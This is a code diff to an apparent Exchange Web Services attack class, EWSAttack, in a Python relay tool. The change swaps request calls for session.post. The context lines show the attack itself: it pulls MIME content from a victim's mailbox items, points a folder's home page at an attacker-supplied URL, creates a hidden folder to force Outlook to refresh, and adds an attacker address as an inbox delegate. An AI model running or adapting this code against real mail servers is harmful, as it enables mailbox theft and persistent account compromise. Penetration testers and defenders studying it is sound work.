@@ -90,8 +90,7 @@ class EWSAttack(Thread):
 				for item in folderXML.findall(".//t:ItemId", exchangeNamespace):
 					params = {'ExchangeVersion': exchangeVersion,'Id': item.get('Id'), 'ChangeKey': item.get('ChangeKey')}
 					body = helper.convertFromTemplate(params, templatesFolder + "getItem.tpl")
-					self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
-					result = self.client.session.getresponse().read()
+					result = self.client.session.post(self.client.target, body, {"Content-Type":"text/xml"}).text
 
 					itemXML = ET.fromstring(result)
 					mimeContent = itemXML.find(".//t:MimeContent", exchangeNamespace).text
@@ -125,8 +124,7 @@ class EWSAttack(Thread):
 	
 				#---- Send the request
 				print helper.color("[+] Sending request to set the [{}] folder's home page to [{}]".format(self.config.ewsFolder, self.config.ewsHomePageURL))
-				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
-				result = self.client.session.getresponse().read()
+				result = self.client.session.post(self.client.target, body, {"Content-Type":"text/xml"}).text
 			
 				#---- Prepare the request to create a hidden folder (trick to force the refresh of the Outlook client)
 				params = {'ExchangeVersion': exchangeVersion, 'ParentFolder': self.config.ewsFolder }
@@ -134,8 +132,7 @@ class EWSAttack(Thread):
 	
 				#---- Send the request
 				print helper.color("[+] Sending request to create a hidden folder under the [{}] folder".format(self.config.ewsFolder))
-				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
-				result = self.client.session.getresponse().read()
+				result = self.client.session.post(self.client.target, body, {"Content-Type":"text/xml"}).text
 				print helper.color(result, 'blue')
 
 			except Exception, e:
@@ -155,8 +152,7 @@ class EWSAttack(Thread):
 	
 				#---- Send the request
 				print helper.color("[+] Sending request to resolve the principal eMail address for user [{}] ".format(self.username))
-				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
-				result = self.client.session.getresponse().read()
+				result = self.client.session.post(self.client.target, body, {"Content-Type":"text/xml"}).text
 				
 				#---- Parse the response and retrieve the eMail address
 				respXML = ET.fromstring(result)
@@ -168,8 +164,7 @@ class EWSAttack(Thread):
 	
 				#---- Send the request
 				print helper.color("[+] Sending request to add [{}] as a delegate address for [{}] inbox".format(self.config.ewsDestAddress, eMailAddress))
-				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
-				result = self.client.session.getresponse().read()
+				result = self.client.session.post(self.client.target, body, {"Content-Type":"text/xml"}).text
 				print helper.color(result, 'blue')
 
 			except Exception, e:
